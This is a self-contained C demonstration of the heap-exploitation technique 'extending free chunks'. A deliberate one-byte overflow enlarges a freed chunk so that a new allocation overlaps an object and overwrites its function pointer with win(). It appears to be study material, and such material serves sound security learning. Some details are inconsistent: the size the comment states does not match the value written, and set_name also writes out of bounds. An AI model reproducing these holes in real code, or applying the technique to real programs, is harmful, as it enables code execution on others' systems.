#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/*
	Extending Free Chunks

	
	heap layout:
		-------
		   A 		<=  not free
		-------
		   B 		<=  freed
		-------
		  obj 		<=	not free



	exploit: 
		Extending Free Chunks

	0x01:
	free chunk B
	
	0x02:
	overwrite size field of freed chunk B to extend chunk B's real size

	0x03:
	remalloc a big chunk whose size < sizeof(chunk B) + sizeof(obj)

	0x04:
	set data for new big chunk to overwrite function pointer of chunk obj.



*/
#define M_SIZE 			sizeof(size_t)
#define CHUNK_HDR_SIZE	2*M_SIZE

struct obj{
	void(*fn_setname)(struct obj *pobj, char*);
	void(*fn_getname)(struct obj *pobj);
	char name[0x20];
};


void set_name(struct obj *pobj, char *name) 
{
	memcpy(pobj->name, name, 0x20);
	pobj->name[0x20] = '\x00';
}

void get_name(struct obj *pobj) 
{
	printf("chunk: %p -> name: %s\n", pobj, pobj->name);
}

void win() 
{
	printf("exploit!\n");
}

int main() {
	char * A, * B, * C;
	struct obj  *pobj;

	A = malloc(0x100 - M_SIZE);
	B = malloc(0x100 - M_SIZE);
	pobj = (struct obj*)malloc(sizeof(struct obj));

	pobj->fn_setname = set_name;
	pobj->fn_getname = get_name;
	pobj->fn_setname(pobj, "this is obj");
	pobj->fn_getname(pobj);
	
	free(B); // Freeing B

	/* 
	* one byte Overflow in A
	* The old chunk B's size becomes 0x181 instead of 0x101
	*/
	A[0x100 - CHUNK_HDR_SIZE + M_SIZE] = (sizeof(struct obj) + CHUNK_HDR_SIZE); // | 0x01;		// LSB bit could be 0x00 or 0x01 , because chunk B is freed

	C = malloc(0x100 + sizeof(struct obj) - M_SIZE); // Allocation of old B size + obj size
	*(size_t*)(&C[0x100 + M_SIZE]) = win;
	
	printf("New C chunk: %p \n", C); 


	pobj->fn_getname(pobj);

	getchar();

	//free(A);
	//free(pobj);
	//free(C);

	return 0;
}